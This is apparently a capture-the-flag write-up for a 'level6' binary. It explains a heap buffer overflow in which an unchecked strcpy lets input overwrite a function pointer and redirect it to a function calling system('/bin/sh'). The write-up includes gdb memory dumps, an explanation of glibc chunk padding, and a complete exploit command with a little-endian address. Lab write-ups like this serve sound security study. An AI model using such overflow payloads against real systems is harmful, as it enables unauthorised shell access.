after reviewing the program we can see that the program is vulnerable to buffer overflow because the function strcpy does not check the size of the input and it copies the input to the buffer without checking if it fits in the buffer.

that we will help us to overwrite the pointer to the function and make it point to the function n() that will call system("/bin/sh").

this is the following plan to exploit the program:

```bash
BUFFER (64 bytes)
┌──────────────────────────┐
│ AAAAAAAAAAAAAAAAAAAAAAAA │ fill the buffer with 64 bytes of A's
└──────────────────────────┘
FUNCTION POINTER (4 bytes)
┌──────────────┐
│ ??? ??? ???  │  ← gets overwritten chnage it from the address of m() to the address of n()
└──────────────┘
```

but when we see the memory layout of the program when the buffer and the pointer located in the heap we see there is more than 64 bytes between the buffer and the pointer to the function so we need to fill the buffer with more than 64 bytes to reach the pointer to the function.

```bash
(gdb) x/24xw 0x804a000
0x804a000:      0x00000000      0x00000049      0x00000000      0x00000000
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a050:      0x08048468      0x00000000      0x00000000      0x00020fa9
```

here every address is 4 bytes and we can see that the buffer is located at 0x804a000 and the pointer to the function is located at 0x804a050 so we need to fill the buffer with 72 bytes to reach the pointer to the function.


but why 72 bytes ?? 

as what you think when you allocate a buffer of 64 bytes the malloc function is allocate just 64 bytes 

let's see what happens behind the scene when we allocate a buffer of 64 bytes using malloc function.

You think : [ 64 bytes buffer ]

But in reality, glibc does: [ HEADER ][ 64 bytes ][ PADDING ]

when we fill 64 of the buffer we found there's is 8 bytes of padding between the buffer and the pointer to the function so we need to fill the buffer with 72 bytes to reach the pointer to the function.


the final payload will be:

```bash
./level6 "$(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')"
```

where `\x54\x84\x04\x08` is the address of the function n() in little-endian format.




